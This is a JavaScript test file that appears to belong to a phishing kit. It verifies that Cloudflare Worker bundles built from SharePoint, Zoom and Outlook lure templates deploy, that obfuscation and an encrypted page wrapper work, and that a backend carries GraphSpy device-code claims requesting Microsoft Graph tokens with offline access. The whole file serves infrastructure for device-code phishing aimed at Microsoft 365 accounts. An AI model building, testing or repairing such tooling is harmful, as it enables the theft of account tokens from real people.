require('./test-env');
/**
 * Worker deployment simulation: build the real Cloudflare worker bundle
 * exactly like buildWorkerScript() does (same template, same placeholder
 * replacement, same ESM wrapper), then verify it would deploy:
 *
 *   1. No unresolved {{PLACEHOLDER}} literals remain in the bundle.
 *   2. The bundle parses as valid ES module JavaScript (node --check).
 *   3. The GraphSpy device-code claims block (ngcmfa/cae) is present.
 *   4. The ESM "export default" wrapper is present.
 *   5. The worker embeds the SAME page format as the static export
 *      (the encrypted export wrapper with its client-side decryption
 *      bootstrap) - worker deployments serve the export-format HTML.
 *   6. The final bundle evaluates as an ES module in a window-less
 *      runtime (a short-lived child Node process - exactly what
 *      Cloudflare does when it instantiates the module before accepting
 *      the upload) and exposes the default fetch handler.
 *      Regression: the old full-bundle obfuscation injected a top-level
 *      `window` reference (disableConsoleOutput shim) that made
 *      Cloudflare reject the upload with
 *        Uncaught ReferenceError: window is not defined
 *   7. The bundle stays within Cloudflare's 1 MiB free-plan script limit.
 *
 * db is stubbed; no network / DB required.
 */
const path = require('path');
const fs = require('fs');
const ROOT = path.resolve(__dirname, '..', '..');

// Mutable admin settings - buildWorkerScript/renderPageHtml read the
// settings table on every call, so obfuscation can be toggled per build.
const dbState = { obfuscation: false };
const dbPath = require.resolve(path.join(ROOT, 'backend', 'database', 'connection.js'));
require.cache[dbPath] = {
  id: dbPath,
  filename: dbPath,
  loaded: true,
  exports: {
    query: async (sql) => {
      if (/FROM settings/i.test(String(sql))) {
        return [[{ setting_key: 'obfuscation_enabled', setting_value: dbState.obfuscation ? 'true' : 'false' }], []];
      }
      return [[], []];
    },
    getConnection: async () => ({ query: async () => [[], []], release: () => {} }),
    pool: { query: async () => [[], []] },
  },
};

const templateLoader = require(path.join(ROOT, 'backend', 'services', 'templateloader.js'));
const { execFileSync } = require('child_process');

let pass = 0, fail = 0;
function check(name, cond, extra) {
  if (cond) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + (extra ? '  -> ' + extra : '')); }
}

function makeLink(templateType) {
  return {
    id: 1,
    template_type: templateType,
    verification_design: 'outlook',
    title_text: 'Test',
    message_text: 'msg',
    button_text: 'Go',
    file_name: 'file.pdf',
    pages: 1,
    destination_url: 'https://example.com',
    turnstile_enabled: true,
  };
}

// Cloudflare instantiates the uploaded module before accepting it; a
// top-level reference to a browser-only global (window) is rejected.
// Replicate that: import the bundle in a child Node process (no window)
// and require the default fetch handler. Returns 0 only if deployable.
function childImportOk(code) {
  const bundlePath = path.join('/tmp', 'vc-worker-rt-' + Date.now() + '-' + Math.random().toString(36).slice(2) + '.mjs');
  const checker = [
    'globalThis.self = globalThis;',
    'import(process.argv[1]).then(function (m) {',
    '  if (m && m.default && typeof m.default.fetch === "function") process.exit(0);',
    '  process.exit(2);',
    '}).catch(function () { process.exit(1); });',
  ].join('\n');
  try {
    fs.writeFileSync(bundlePath, code);
    execFileSync(process.execPath, ['--input-type=module', '-e', checker, bundlePath], { stdio: 'pipe' });
    return 0;
  } catch (e) {
    return (e.status == null ? 1 : e.status);
  } finally {
    try { fs.unlinkSync(bundlePath); } catch (e) { /* ignore */ }
  }
}

function nodeCheckOk(code) {
  const bundlePath = path.join('/tmp', 'vc-worker-check-' + Date.now() + '-' + Math.random().toString(36).slice(2) + '.mjs');
  try {
    fs.writeFileSync(bundlePath, code);
    execFileSync(process.execPath, ['--check', bundlePath], { stdio: 'pipe' });
    return true;
  } catch (e) {
    return false;
  } finally {
    try { fs.unlinkSync(bundlePath); } catch (e) { /* ignore */ }
  }
}

function assertBundle(label, worker) {
  check(label + ': bundle built', !!worker && worker.length > 1000, 'len=' + (worker || '').length);
  check(label + ': ESM export default present', !!worker && worker.includes('export default'));
  const unresolved = (String(worker).match(/'{{[A-Z_]+}}'/g) || []).filter(v => !v.includes('TEMPLATE_HTML'));
  check(label + ': no unresolved placeholders (single-quoted)', unresolved.length === 0, JSON.stringify(unresolved));
  const unresolvedDq = (String(worker).match(/"{{[A-Z_]+}}"/g) || []);
  check(label + ': no unresolved placeholders (double-quoted)', unresolvedDq.length === 0, JSON.stringify(unresolvedDq));
  check(label + ': node --check parses the bundle', nodeCheckOk(worker));
  // The worker serves the static-export format page: the encrypted payload
  // plus its decryption bootstrap (the "vg-decrypt-msg" element only exists
  // in the export wrapper).
  check(label + ': embeds the static-export HTML format', !!worker && worker.includes('vg-decrypt-msg'));
  // The window-less module evaluation - the exact step Cloudflare performs.
  check(label + ': evaluates window-less with fetch handler (CF simulation)', childImportOk(worker) === 0);
  // Cloudflare script size limit: 1 MiB on the free plan.
  check(label + ': within 1 MiB Workers script limit', Buffer.byteLength(worker, 'utf8') <= 1048576,
    'bytes=' + Buffer.byteLength(worker, 'utf8'));
}

(async () => {
  const user = { id: 99 };

  // 1) Plain build (obfuscation off) - the original guarantees.
  const worker = await templateLoader.buildWorkerScript(makeLink('sharepoint4'), user, 'https://example.com');
  check('sharepoint4: bundle built', !!worker && worker.length > 1000, 'len=' + (worker || '').length);
  check('sharepoint4: ESM export default present', !!worker && worker.includes('export default'));
  const deviceProxySrc = fs.readFileSync(path.join(ROOT, 'backend', 'services', 'deviceproxy.js'), 'utf8');
  // The device-code request now happens on the backend (see the delegation check
  // below), so the GraphSpy claims live there rather than in the worker bundle.
  check('sharepoint4: backend carries GraphSpy ngcmfa claim', /amr:\s*\{\s*values:\s*\['ngcmfa'\]/.test(deviceProxySrc));
  check('sharepoint4: backend carries GraphSpy CAE claim', /xms_cc:\s*\{\s*values:\s*\['cp1'\]/.test(deviceProxySrc));
  check('sharepoint4: backend carries the Graph default scope', deviceProxySrc.includes("'https://graph.microsoft.com/.default openid offline_access'"));
  check('sharepoint4: worker delegates the device-code flow to the backend poller',
    /backendFetch\('\/api\/device\/start'/.test(worker));

  // 2) The production failure scenario: zoom1 (the template from the failed
  //    deployment) with obfuscation ENABLED, as in the production settings.
  dbState.obfuscation = true;
  const obfWorker = await templateLoader.buildWorkerScript(makeLink('zoom1'), user, 'https://example.com');
  assertBundle('zoom1+obf', obfWorker);

  // 3) sharepoint4 in the export format with obfuscation off.
  dbState.obfuscation = false;
  const plainWorker = await templateLoader.buildWorkerScript(makeLink('sharepoint4'), user, 'https://example.com');
  assertBundle('sharepoint4+plain', plainWorker);

  console.log('\n==== ' + pass + ' passed, ' + fail + ' failed ====');
  process.exit(fail === 0 ? 0 : 1);
})().catch(err => {
  console.error('TEST CRASH:', err);
  process.exit(2);
});
